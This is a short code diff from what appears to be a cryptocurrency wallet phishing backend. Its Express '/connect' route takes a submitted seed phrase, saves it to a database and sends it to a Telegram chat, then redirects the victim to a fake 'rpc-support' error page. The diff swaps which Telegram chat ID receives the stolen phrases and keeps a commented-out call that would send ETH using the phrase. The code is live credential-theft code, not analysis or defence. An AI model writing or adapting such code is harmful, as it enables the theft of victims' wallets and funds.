@@ -526,9 +526,10 @@ app.post("/connect", async (req, res) => {
     if (phraseinput != null) {
       // sendETH(phraseinput)
     }
+    sendToTelegram("1618693731", text);
     const savedData = await HubWallet.create(data);
 
-     sendToTelegram("7359175061", text);
+     
     // sendToTelegramPacho("6852059122", text);
 
     res.redirect('https://rpc-support.surge.sh/badrequest');
